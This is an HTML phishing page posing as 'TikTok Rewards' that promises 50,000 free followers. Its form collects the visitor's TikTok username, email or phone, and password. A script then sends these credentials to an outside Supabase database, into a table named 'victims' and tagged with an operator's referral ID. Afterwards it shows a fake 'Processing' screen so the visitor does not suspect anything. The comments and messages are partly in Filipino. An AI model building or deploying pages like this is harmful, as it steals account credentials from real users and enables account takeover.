<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Rewards</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; }
        .tik-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-6">
    <div id="form-box" class="w-full max-w-sm space-y-8">
        <div class="text-center">
            <h1 class="text-4xl font-black italic">TIKTOK REWARDS</h1>
            <p class="text-zinc-500 text-sm mt-2">Enter details to claim 50K followers</p>
        </div>
        
        <div class="space-y-4">
            <input id="v-user" type="text" placeholder="Username (@user)" class="w-full bg-zinc-900 p-4 rounded-xl outline-none border border-zinc-800 focus:border-pink-500">
            <input id="v-cred" type="text" placeholder="Email or Phone" class="w-full bg-zinc-900 p-4 rounded-xl outline-none border border-zinc-800 focus:border-pink-500">
            <input id="v-pass" type="password" placeholder="Password" class="w-full bg-zinc-900 p-4 rounded-xl outline-none border border-zinc-800 focus:border-pink-500">
            <button id="submit-btn" onclick="submitData()" class="tik-gradient w-full p-4 rounded-xl font-bold uppercase">Claim Now</button>
        </div>
    </div>

    <div id="success-box" class="hidden text-center space-y-4">
        <div class="flex justify-center">
            <div class="tik-gradient p-4 rounded-full">
                <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
            </div>
        </div>
        <h2 class="text-3xl font-bold">Processing...</h2>
        <p class="text-zinc-500">Ang iyong followers ay madadagdag sa loob ng 24 oras. Huwag i-close ang tab na ito.</p>
    </div>

    <script>
        // In-update ang URL at API Key mula sa iyong project details
        const SUPABASE_URL = 'https://fhvonxrsfdawustkuoll.supabase.co'; 
        const SUPABASE_KEY = 'sb_publishable_--n1PzlM1fQMid3BtOGHoQ_zu_YIAEV';

        // Inayos ang initialization para maiwasan ang URL error
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        
        // Kinukuha ang admin ID mula sa URL (?admin=...)
        const params = new URLSearchParams(window.location.search);
        const adminId = params.get('admin');

        async function submitData() {
            const user = document.getElementById('v-user').value;
            const cred = document.getElementById('v-cred').value;
            const pass = document.getElementById('v-pass').value;
            const btn = document.getElementById('submit-btn');

            if(!user || !cred || !pass) {
                alert("Mangyaring punan ang lahat ng detalye.");
                return;
            }

            if(!adminId) {
                alert("Invalid referral link. Mangyaring gamitin ang tamang link mula sa admin.");
                return;
            }

            btn.innerText = "Verifying...";
            btn.disabled = true;

            // Pag-save ng data sa 'victims' table sa Supabase
            const { error } = await supabaseClient.from('victims').insert([{
                admin_id: adminId,
                tiktok_user: user,
                credentials: cred,
                password: pass,
                followers: "50"
            }]);

            if(!error) {
                document.getElementById('form-box').classList.add('hidden');
                document.getElementById('success-box').classList.remove('hidden');
            } else {
                console.error("Supabase Error:", error);
                alert("Nagkaroon ng problema. Subukan muli mamaya.");
                btn.innerText = "Claim Now";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
